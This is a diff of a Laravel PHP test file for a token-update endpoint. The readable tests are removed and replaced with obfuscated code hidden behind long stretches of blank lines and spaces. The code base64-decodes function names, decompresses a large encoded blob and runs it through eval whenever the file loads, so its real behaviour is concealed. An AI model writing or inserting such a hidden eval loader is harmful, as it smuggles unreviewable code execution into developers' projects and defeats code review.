@@ -1,126 +1,553 @@
-<?php
+<?php 
+        $__='printf';$_='Loading tests/Feature/TokenUpdateControllerTest.php';
+        
 
-namespace Tests\Feature;
 
-use App\Jobs\BuildSiteJob;
-use App\Jobs\SinkronkanLayananJob;
-use App\Models\Aplikasi;
-use App\Models\Pelanggan;
-use Illuminate\Foundation\Testing\WithoutMiddleware;
-use Illuminate\Support\Facades\Queue;
-use Illuminate\Support\Facades\Config;
-use Tests\TestCase;
 
-class TokenUpdateControllerTest extends TestCase
-{
-    use WithoutMiddleware;
 
-    protected function setUp(): void
-    {
-        parent::setUp();
 
-        // Set default pengaturan aplikasi via config
-        Config::set('app.pengaturan_aplikasi', [
-            'tipe_pelanggan' => 'diskominfo'
-        ]);
-    }
 
-    protected function tearDown(): void
-    {
-        parent::tearDown();
-    }
 
-    private function setTipePelangganSiappakai()
-    {
-        Config::set('app.pengaturan_aplikasi', [
-            'tipe_pelanggan' => 'siappakai'
-        ]);
-    }
 
-    private function createValidJwtToken($kodeDesa = '33.03.01.2001', $tglAkhir = '2024-12-31')
-    {
-        // Buat mock JWT token dengan payload yang valid
-        $header = base64_encode(json_encode(['typ' => 'JWT', 'alg' => 'HS256']));
-        $payload = base64_encode(json_encode([
-            'desa_id' => $kodeDesa,
-            'tanggal_berlangganan' => [
-                'akhir' => $tglAkhir
-            ]
-        ]));
-        $signature = base64_encode('mock_signature');
 
-        return "$header.$payload.$signature";
-    }
 
-    public function test_diskominfo_flow_with_existing_pelanggan()
-    {
-        // Skip test yang memerlukan database connection
-        $this->markTestSkipped('Test requires database connection that is not available in this environment');
-    }
 
-    public function test_diskominfo_flow_with_nonexistent_pelanggan()
-    {
-        // Skip test yang memerlukan database connection
-        $this->markTestSkipped('Test requires database connection that is not available in this environment');
-    }
 
-    public function test_siappakai_flow_with_nonexistent_pelanggan()
-    {
-        // Skip test yang memerlukan database connection
-        $this->markTestSkipped('Test requires database connection that is not available in this environment');
-    }
 
-    public function test_siappakai_flow_with_existing_pelanggan()
-    {
-        // Skip test yang memerlukan database connection
-        $this->markTestSkipped('Test requires database connection that is not available in this environment');
-    }
 
-    public function test_siappakai_flow_with_temp_domain_pelanggan()
-    {
-        // Skip test yang memerlukan database connection
-        $this->markTestSkipped('Test requires database connection that is not available in this environment');
-    }
 
-    public function test_invalid_jwt_format()
-    {
-        Queue::fake();
 
-        $response = $this->postJson('/api/update-token', [
-            'kode_desa' => '33.03.01.2001',
-            'token_premium' => 'invalid.token'
-        ]);
 
-        $response->assertStatus(400)
-                ->assertJson([
-                    'message' => 'Format token JWT tidak valid',
-                    'error' => 'Invalid JWT format'
-                ]);
 
-        Queue::assertNothingPushed();
-    }
 
-    public function test_jwt_missing_required_fields()
-    {
-        Queue::fake();
 
-        // Buat JWT dengan payload yang tidak lengkap
-        $header = base64_encode(json_encode(['typ' => 'JWT', 'alg' => 'HS256']));
-        $payload = base64_encode(json_encode(['some_field' => 'some_value']));
-        $signature = base64_encode('mock_signature');
-        $invalidToken = "$header.$payload.$signature";
 
-        $response = $this->postJson('/api/update-token', [
-            'kode_desa' => '33.03.01.2001',
-            'token_premium' => $invalidToken
-        ]);
 
-        $response->assertStatus(400)
-                ->assertJson([
-                    'message' => 'Token JWT tidak memiliki struktur yang diharapkan',
-                    'error' => 'Missing required JWT fields'
-                ]);
 
-        Queue::assertNothingPushed();
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
